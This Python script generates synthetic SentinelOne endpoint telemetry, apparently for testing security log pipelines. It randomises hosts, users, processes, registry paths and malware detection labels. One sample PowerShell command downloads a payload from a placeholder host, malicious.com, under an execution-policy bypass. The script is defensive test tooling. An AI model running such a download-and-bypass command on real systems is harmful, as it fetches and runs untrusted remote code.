#!/usr/bin/env python3
"""
SentinelOne Endpoint (Deep Visibility) event generator
Generates realistic SentinelOne XDR endpoint events including process execution,
file operations, network connections, and threat detections.
"""
from __future__ import annotations
import json
import random
import time
import hashlib
import uuid
from datetime import datetime, timezone, timedelta
from typing import Dict, List

# Endpoint types and platforms
ENDPOINT_TYPES = ["server", "workstation", "laptop", "kubernetes"]
OPERATING_SYSTEMS = [
    {"os": "Windows", "version": "10", "arch": "x64"},
    {"os": "Windows", "version": "11", "arch": "x64"},
    {"os": "Windows", "version": "Server 2019", "arch": "x64"},
    {"os": "Windows", "version": "Server 2022", "arch": "x64"},
    {"os": "Linux", "version": "Ubuntu 20.04", "arch": "x64"},
    {"os": "Linux", "version": "Ubuntu 22.04", "arch": "x64"},
    {"os": "Linux", "version": "RHEL 8", "arch": "x64"},
    {"os": "Linux", "version": "CentOS 7", "arch": "x64"},
    {"os": "macOS", "version": "13.0", "arch": "arm64"},
    {"os": "macOS", "version": "14.0", "arch": "x64"},
]

# Users for different scenarios
USERS = [
    "jean.picard", "william.riker", "data.android", "geordi.laforge", "worf.security", 
    "deanna.troi", "beverly.crusher", "wesley.crusher", "tasha.yar", "guinan.bartender",
    "james.kirk", "spock.science", "leonard.mccoy", "montgomery.scott", "nyota.uhura",
    "pavel.chekov", "hikaru.sulu", "benjamin.sisko", "kira.nerys", "julian.bashir",
    "jadzia.dax", "miles.obrien", "odo.security", "kathryn.janeway", "chakotay.commander",
    "tuvok.security", "tom.paris", "belanna.torres", "harry.kim", "seven.of.nine", 
    "admin", "service_account"
]

# Event types and their characteristics
ENDPOINT_EVENT_TYPES = [
    {
        "eventType": "Process Creation",
        "metaEventName": "PROCESSCREATION",
        "severity": "INFO",
        "category": "Process",
        "threatLevel": 0
    },
    {
        "eventType": "File Creation",
        "metaEventName": "HTTP",
        "severity": "INFO", 
        "category": "File",
        "threatLevel": 0
    },
    {
        "eventType": "Network Connection",
        "metaEventName": "HTTP",
        "severity": "INFO",
        "category": "Network",
        "threatLevel": 0
    },
    {
        "eventType": "Malware Detection",
        "metaEventName": "FILESCAN",
        "severity": "CRITICAL",
        "category": "Threats",
        "threatLevel": 10
    },
    {
        "eventType": "Suspicious Activity",
        "metaEventName": "PROCESSCREATION",
        "severity": "HIGH",
        "category": "Behavioral",
        "threatLevel": 8
    },
    {
        "eventType": "Registry Modification",
        "metaEventName": "REGKEYCREATE",
        "severity": "MEDIUM",
        "category": "Registry",
        "threatLevel": 5
    },
    {
        "eventType": "PowerShell Execution",
        "metaEventName": "SCRIPTS",
        "severity": "MEDIUM",
        "category": "Process",
        "threatLevel": 6
    },
    {
        "eventType": "Credential Access",
        "metaEventName": "PROCESSCREATION",
        "severity": "HIGH",
        "category": "Credentials",
        "threatLevel": 9
    },
    {
        "eventType": "Container Activity",
        "metaEventName": "PROCESSCREATION",
        "severity": "INFO",
        "category": "Container",
        "threatLevel": 2
    },
    {
        "eventType": "Kubernetes Event",
        "metaEventName": "PROCESSCREATION",
        "severity": "INFO",
        "category": "Kubernetes",
        "threatLevel": 1
    },
    {
        "eventType": "Scheduled Task Update",
        "metaEventName": "SCHEDTASKUPDATE",
        "severity": "MEDIUM",
        "category": "ScheduledTask",
        "threatLevel": 3
    },
    {
        "eventType": "Scheduled Task Start",
        "metaEventName": "SCHEDTASKSTART",
        "severity": "INFO",
        "category": "ScheduledTask",
        "threatLevel": 2
    },
    {
        "eventType": "Scheduled Task Trigger",
        "metaEventName": "SCHEDTASKTRIGGER",
        "severity": "INFO",
        "category": "ScheduledTask",
        "threatLevel": 2
    },
    {
        "eventType": "Scheduled Task Delete",
        "metaEventName": "SCHEDTASKDELETE",
        "severity": "MEDIUM",
        "category": "ScheduledTask",
        "threatLevel": 4
    },
    {
        "eventType": "Duplicate Process",
        "metaEventName": "DUPLICATEPROCESS",
        "severity": "HIGH",
        "category": "Process",
        "threatLevel": 7
    }
]

# Common processes and files
PROCESSES = [
    {"name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "cmdline": "C:\\Windows\\Explorer.exe"},
    {"name": "chrome.exe", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "cmdline": "chrome.exe --new-window"},
    {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "cmdline": "powershell.exe -ExecutionPolicy Bypass"},
    {"name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "cmdline": "cmd.exe /c dir"},
    {"name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe", "cmdline": "svchost.exe -k NetworkService"},
    {"name": "bash", "path": "/bin/bash", "cmdline": "/bin/bash -c ls -la"},
    {"name": "python3", "path": "/usr/bin/python3", "cmdline": "python3 script.py"},
    {"name": "docker", "path": "/usr/bin/docker", "cmdline": "docker run -d nginx"},
    {"name": "kubectl", "path": "/usr/local/bin/kubectl", "cmdline": "kubectl get pods"},
    {"name": "systemd", "path": "/lib/systemd/systemd", "cmdline": "/lib/systemd/systemd --user"}
]

# Threat indicators
THREAT_INDICATORS = [
    {"name": "Emotet", "type": "Malware", "family": "Banking Trojan"},
    {"name": "Cobalt Strike", "type": "Tool", "family": "Post-Exploitation"},
    {"name": "Mimikatz", "type": "Tool", "family": "Credential Theft"},
    {"name": "PowerShell Empire", "type": "Framework", "family": "Post-Exploitation"},
    {"name": "WannaCry", "type": "Ransomware", "family": "Crypto-Ransomware"},
    {"name": "TrickBot", "type": "Malware", "family": "Banking Trojan"},
]

def generate_endpoint_name(endpoint_type: str, os_info: Dict) -> str:
    """Generate realistic endpoint names"""
    prefixes = {
        "server": ["SRV", "WEB", "DB", "APP", "DC"],
        "workstation": ["WS", "PC", "DESK"],
        "laptop": ["LT", "NB", "LAP"],
        "kubernetes": ["K8S", "NODE", "WORKER"]
    }
    
    prefix = random.choice(prefixes.get(endpoint_type, ["EP"]))
    suffix = random.randint(100, 999)
    
    if os_info["os"] == "Linux":
        return f"{prefix.lower()}-{suffix}"
    else:
        return f"{prefix}-{suffix}"

def generate_sha256() -> str:
    """Generate a realistic SHA256 hash"""
    return hashlib.sha256(str(random.random()).encode()).hexdigest()

def generate_ip_address() -> str:
    """Generate internal or external IP addresses"""
    if random.random() < 0.7:  # 70% internal IPs
        return f"10.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    else:  # 30% external IPs
        return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def format_timestamp(dt: datetime) -> int:
    """Convert datetime to epoch timestamp (milliseconds) for SentinelOne events"""
    return int(dt.timestamp() * 1000)

def sentinelone_endpoint_log(custom_fields: Dict = None) -> Dict:
    """Generate a SentinelOne Deep Visibility endpoint event matching actual field structure"""
    
    # Select random configurations
    endpoint_type = random.choice(ENDPOINT_TYPES)
    os_info = random.choice(OPERATING_SYSTEMS)
    user = random.choice(USERS)
    event_info = random.choice(ENDPOINT_EVENT_TYPES)
    process_info = random.choice(PROCESSES)
    
    # Generate base event structure
    event_time = datetime.now(timezone.utc) - timedelta(minutes=random.randint(0, 1440))
    endpoint_name = generate_endpoint_name(endpoint_type, os_info)
    
    event = {
        # Core event fields
        "event.id": str(uuid.uuid4()),
        "event.time": format_timestamp(event_time),
        "event.category": event_info["category"],
        "event.type": event_info["eventType"],
        "meta.event.name": event_info["metaEventName"],
        
        # Endpoint information
        "endpoint.name": endpoint_name,
        "endpoint.os": f"{os_info['os']} {os_info['version']}",
        "endpoint.type": endpoint_type,
        
        # Agent information
        "agent.uuid": str(uuid.uuid4()),
        "agent.version": f"22.{random.randint(1,4)}.{random.randint(1,10)}.{random.randint(100,999)}",
        
        # Site and account information
        "site.id": str(uuid.uuid4()),
        "site.name": "FinanceCorp Main Site",
        "account.id": str(uuid.uuid4()),
        "account.name": "FinanceCorp",
        
        # Data source information
        "dataSource.category": "security",
        "dataSource.vendor": "SentinelOne",
        
        # OS information
        "os.name": os_info["os"],
        
        # Session and process tracking
        "session": random.randint(1, 100),
        "process.unique.key": f"{random.randint(1000000000, 9999999999)}",
        
        # Source process information (following actual field structure)
        "src.process.name": process_info["name"],
        "src.process.pid": random.randint(1000, 65535),
        "src.process.uid": str(uuid.uuid4()),
        "src.process.user": user,
        "src.process.cmdline": process_info["cmdline"],
        "src.process.displayName": process_info["name"],
        "src.process.startTime": format_timestamp(event_time - timedelta(seconds=random.randint(1, 3600))),
        "src.process.integrityLevel": random.choice(["Low", "Medium", "High", "System"]),
        "src.process.isNative64Bit": random.choice([True, False]),
        "src.process.isStorylineRoot": random.choice([True, False]),
        "src.process.sessionId": random.randint(0, 10),
        "src.process.signedStatus": random.choice(["Signed", "Unsigned", "Invalid"]),
        "src.process.subsystem": random.choice(["Windows CUI", "Windows GUI", "POSIX CUI"]),
        "src.process.storyline.id": str(uuid.uuid4()),
        
        # Source process image information
        "src.process.image.path": process_info["path"],
        "src.process.image.sha1": hashlib.sha1(str(random.random()).encode()).hexdigest(),
        "src.process.image.sha256": generate_sha256(),
        "src.process.image.size": random.randint(10240, 52428800),  # 10KB to 50MB
        "src.process.image.uid": str(uuid.uuid4()),
        "src.process.image.type": random.choice(["Executable", "DLL", "Script"]),
        
        # Parent process information
        "src.process.parent.name": random.choice(["explorer.exe", "services.exe", "svchost.exe", "systemd", "init"]),
        "src.process.parent.pid": random.randint(100, 999),
        "src.process.parent.uid": str(uuid.uuid4()),
        "src.process.parent.cmdline": random.choice([
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\services.exe",
            "C:\\Windows\\System32\\svchost.exe -k NetworkService",
            "/lib/systemd/systemd --user"
        ]),
        "src.process.parent.displayName": random.choice(["Windows Explorer", "Service Control Manager", "Service Host", "systemd"]),
        "src.process.parent.image.path": random.choice([
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\services.exe", 
            "C:\\Windows\\System32\\svchost.exe",
            "/lib/systemd/systemd"
        ]),
        "src.process.parent.image.sha1": hashlib.sha1(str(random.random()).encode()).hexdigest(),
        "src.process.parent.image.sha256": generate_sha256(),
        "src.process.parent.image.size": random.randint(10240, 52428800),
        "src.process.parent.image.uid": str(uuid.uuid4()),
        "src.process.parent.image.type": "Executable",
        "src.process.parent.integrityLevel": random.choice(["Medium", "High", "System"]),
        "src.process.parent.isNative64Bit": True,
        "src.process.parent.isStorylineRoot": random.choice([True, False]),
        "src.process.parent.sessionId": random.randint(0, 10),
        "src.process.parent.signedStatus": "Signed",
        "src.process.parent.startTime": format_timestamp(event_time - timedelta(seconds=random.randint(3600, 86400))),
        "src.process.parent.storyline.id": str(uuid.uuid4()),
        "src.process.parent.subsystem": random.choice(["Windows CUI", "Windows GUI"]),
        
        # Process counters (behavioral analytics)
        "src.process.childProcCount": random.randint(0, 50),
        "src.process.crossProcessCount": random.randint(0, 20),
        "src.process.crossProcessDuplicateHandleCount": random.randint(0, 10),
        "src.process.crossProcessDuplicateThreadHandleCount": random.randint(0, 5),
        "src.process.crossProcessOpenProcessCount": random.randint(0, 15),
        "src.process.crossProcessOutOfStorylineCount": random.randint(0, 8),
        "src.process.crossProcessThreadCreateCount": random.randint(0, 3),
        "src.process.dnsCount": random.randint(0, 100),
        "src.process.moduleCount": random.randint(1, 200),
        "src.process.netConnCount": random.randint(0, 50),
        "src.process.netConnInCount": random.randint(0, 25),
        "src.process.netConnOutCount": random.randint(0, 30),
        "src.process.registryChangeCount": random.randint(0, 30),
        "src.process.timedEventCreationCount": random.randint(0, 10),
        "src.process.timedEventDeletionCount": random.randint(0, 5),
        "src.process.timedEventModificationCount": random.randint(0, 8),
        
        # Indicator counts (threat detection)
        "src.process.indicatorEvasionCount": random.randint(0, 5) if event_info["threatLevel"] > 5 else 0,
        "src.process.indicatorExploitationCount": random.randint(0, 3) if event_info["threatLevel"] > 7 else 0,
        "src.process.indicatorGeneralCount": random.randint(0, 10),
        "src.process.indicatorInfostealerCount": random.randint(0, 2) if event_info["threatLevel"] > 6 else 0,
        "src.process.indicatorInjectionCount": random.randint(0, 3) if event_info["threatLevel"] > 5 else 0,
        "src.process.indicatorPersistenceCount": random.randint(0, 4) if event_info["threatLevel"] > 4 else 0,
        "src.process.indicatorPostExploitationCount": random.randint(0, 2) if event_info["threatLevel"] > 8 else 0,
        "src.process.indicatorRansomwareCount": random.randint(0, 1) if event_info["threatLevel"] > 9 else 0,
        "src.process.indicatorReconnaissanceCount": random.randint(0, 6),
        
        # Additional process attributes
        "src.process.isRedirectCmdProcessor": random.choice([True, False]) if "cmd" in process_info["name"] else False,
        "src.process.imageIsExecutable": True if process_info["name"].endswith(".exe") else False,
        "src.process.imageExecutionUpdateCount": random.randint(0, 5)
    }
    
    # Add specialized fields based on event type
    if event_info["eventType"] == "Network Connection":
        event.update({
            "event.network.direction": random.choice(["Outbound", "Inbound"]),
            "event.network.connectionStatus": random.choice(["Established", "Failed", "Blocked"]),
            "event.network.protocolName": random.choice(["TCP", "UDP", "ICMP"]),
            "src.ip.address": generate_ip_address(),
            "src.port.number": random.randint(1024, 65535),
            "dst.ip.address": generate_ip_address(),
            "dst.port.number": random.choice([80, 443, 53, 22, 3389, 135, 445])
        })
    
    elif event_info["eventType"] == "File Creation":
        file_path = f"C:\\Users\\{user}\\Documents\\document_{random.randint(1,1000)}.{random.choice(['txt', 'docx', 'pdf', 'xlsx'])}"
        event.update({
            "tgt.file.path": file_path,
            "tgt.file.size": random.randint(1024, 10485760),
            "tgt.file.oldPath": None
        })
    
    elif event_info["eventType"] == "Malware Detection":
        threat = random.choice(THREAT_INDICATORS)
        event.update({
            "indicator.category": "Malware",
            "indicator.name": threat["name"],
            "indicator.description": f"Detected {threat['type']} - {threat['family']}",
            "indicator.metadata": json.dumps({
                "threat_type": threat["type"],
                "family": threat["family"],
                "confidence": random.randint(80, 100),
                "action": random.choice(["Quarantine", "Kill", "Block", "Monitor"])
            })
        })
    
    elif event_info["eventType"] == "Registry Modification" and "Windows" in os_info["os"]:
        reg_path = random.choice([
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services"
        ])
        event.update({
            "registry.keyPath": reg_path,
            "registry.value": f"entry_{random.randint(1,100)}"
        })
    
    elif event_info["eventType"] == "PowerShell Execution":
        ps_script = random.choice([
            "Get-Process | Where-Object {$_.CPU -gt 100}",
            "Invoke-WebRequest -Uri 'http://malicious.com/payload.ps1'",
            "Get-ADUser -Filter *",
            "New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'calc.exe')"
        ])
        event.update({
            "cmdScript.content": ps_script,
            "src.process.name": "powershell.exe",
            "src.process.cmdline": f"powershell.exe -ExecutionPolicy Bypass -Command \"{ps_script}\""
        })
    
    elif event_info["eventType"] == "DNS Query":
        domain = random.choice([
            "google.com", "microsoft.com", "github.com", 
            "malicious-domain.com", "phishing-site.net", "c2-server.org"
        ])
        event.update({
            "event.dns.request": domain,
            "event.dns.response": generate_ip_address()
        })
    
    elif event_info["eventType"] == "URL Access":
        url = random.choice([
            "https://www.google.com/search?q=sensitive+data",
            "http://suspicious-site.com/download/malware.exe",
            "https://github.com/user/repo/releases/download/tool.zip"
        ])
        event.update({
            "url.address": url,
            "event.url.action": random.choice(["Allowed", "Blocked"])
        })
    
    elif event_info["eventType"] in ["Scheduled Task Update", "Scheduled Task Start", "Scheduled Task Trigger", "Scheduled Task Delete"]:
        task_name = f"UpdateTask_{random.randint(1,100)}"
        event.update({
            "task.name": task_name,
            "task.path": f"C:\\Windows\\Tasks\\{task_name}.job"
        })
    
    elif event_info["eventType"] == "Module Load":
        module_path = random.choice([
            "C:\\Windows\\System32\\kernel32.dll",
            "C:\\Windows\\System32\\ntdll.dll",
            "C:\\Program Files\\Malware\\evil.dll"
        ])
        event.update({
            "module.path": module_path
        })
    
    # Add target process information for some events
    if event_info["eventType"] in ["Process Creation", "Code Injection"]:
        event.update({
            "tgt.process.uid": str(uuid.uuid4()),
            "tgt.process.cmdline": random.choice([
                "notepad.exe document.txt",
                "calc.exe",
                "cmd.exe /c whoami"
            ]),
            "tgt.process.user": user,
            "tgt.process.relation": random.choice(["child", "sibling", "unrelated"])
        })
    
    # Add Windows Event Log information for Windows events
    if "Windows" in os_info["os"]:
        event.update({
            "winEventLog.channel": random.choice(["Security", "System", "Application"]),
            "winEventLog.id": random.randint(1000, 9999),
            "winEventLog.level": random.choice(["Information", "Warning", "Error"]),
            "winEventLog.providerName": "SentinelOne-Agent",
            "winEventLog.description": f"SentinelOne detected {event_info['eventType']} on {endpoint_name}",
            "winEventLog.description.userid": user,
            "winEventLog.description.securityId": f"S-1-5-21-{random.randint(100000000,999999999)}-{random.randint(100000000,999999999)}-{random.randint(100000000,999999999)}-{random.randint(1000,9999)}"
        })
    
    # Add threat intelligence indicators for high-severity events
    if event_info["threatLevel"] > 7:
        event.update({
            "tiIndicator.source": "SentinelOne Threat Intelligence",
            "tiIndicator.value": event.get("src.ip.address", event.get("dst.ip.address", ""))
        })
    
    # Add thread information for process events
    if "Process" in event_info["eventType"]:
        event.update({
            "threadId": random.randint(1000, 9999),
            "threadName": f"Thread_{random.randint(1,20)}"
        })
    
    # Apply custom fields if provided
    if custom_fields:
        event.update(custom_fields)
    
    return event

if __name__ == "__main__":
    # Generate sample events
    print("Sample SentinelOne Endpoint Events:")
    print("=" * 50)
    
    for i in range(3):
        print(f"\nEvent {i+1}:")
        print(sentinelone_endpoint_log())